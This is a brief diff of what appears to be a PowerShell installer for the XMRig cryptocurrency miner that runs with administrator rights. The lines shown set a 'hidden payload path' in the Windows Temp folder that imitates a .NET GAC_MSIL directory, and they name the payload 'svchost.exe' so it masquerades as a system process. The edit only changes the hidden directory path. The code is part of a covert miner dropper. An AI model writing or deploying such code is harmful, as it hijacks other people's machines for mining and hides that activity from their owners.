@@ -121,7 +121,7 @@ cd "$initial_dir\xmrig-6.22.2"
 #Requires -RunAsAdministrator
 
 # Define hidden payload path
-$hiddenDir = "$env:SystemRoot\Temp\Microsoft.NET\Assembly\GAC_MSIL\xmrig-6.22.2\w.bat"
+$hiddenDir = "$env:SystemRoot\Temp\Microsoft.NET\Assembly\GAC_MSIL"
 $payloadName = "svchost.exe"
 $destinationPath = Join-Path $hiddenDir $payloadName
 $newConfigPath_2 = "$initial_dir\xmrig-6.22.2"
